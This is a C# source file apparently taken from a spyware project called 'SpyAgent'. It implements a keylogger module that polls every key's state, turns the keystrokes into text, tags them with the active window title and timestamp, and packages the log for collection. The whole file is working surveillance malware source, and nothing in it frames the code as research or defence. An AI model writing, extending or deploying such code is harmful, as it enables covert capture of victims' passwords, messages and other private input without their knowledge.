namespace SpyAgent.Modules;

using System.Runtime.InteropServices;
using System.Text;
using SpyAgent.Core;
using SpyAgent.Models;
using SpyAgent.Utils;

internal sealed class KeyLogger : ISpyModule
{
    public string ModuleName => "Keylogger";

    private readonly List<KeystrokeLog> _buffer = [];
    private string _lastWindow = "";

    public Task<byte[]?> CollectAsync()
    {
        var captured = CaptureKeystrokes();
        if (captured.Count == 0)
            return Task.FromResult<byte[]?>(null);

        var sb = new StringBuilder();
        foreach (var entry in captured)
        {
            if (entry.WindowTitle != _lastWindow)
            {
                sb.AppendLine();
                sb.AppendLine($"--- [{entry.Timestamp:HH:mm:ss}] {entry.WindowTitle} ---");
                _lastWindow = entry.WindowTitle;
            }
            sb.Append(entry.Character);
        }

        return Task.FromResult<byte[]?>(Encoding.UTF8.GetBytes(sb.ToString()));
    }

    private List<KeystrokeLog> CaptureKeystrokes()
    {
        var result = new List<KeystrokeLog>();
        var currentWindow = NativeHooks.GetActiveWindowTitle();

        for (int key = 1; key < 256; key++)
        {
            var state = NativeHooks.GetKeyState(key);
            if ((state & 0x0001) == 0) continue;

            var character = TranslateKey(key);
            if (character == null) continue;

            result.Add(new KeystrokeLog
            {
                VirtualKeyCode = key,
                Character = character,
                WindowTitle = currentWindow,
                Timestamp = DateTime.UtcNow
            });
        }

        return result;
    }

    private static string? TranslateKey(int vk) => vk switch
    {
        >= 65 and <= 90 => ((char)vk).ToString().ToLower(),
        >= 48 and <= 57 => ((char)vk).ToString(),
        >= 96 and <= 105 => (vk - 96).ToString(),
        32 => " ",
        13 => "\n",
        8 => "\u2190",
        9 => "\t",
        190 => ".",
        188 => ",",
        186 => ";",
        222 => "'",
        _ => null
    };
}
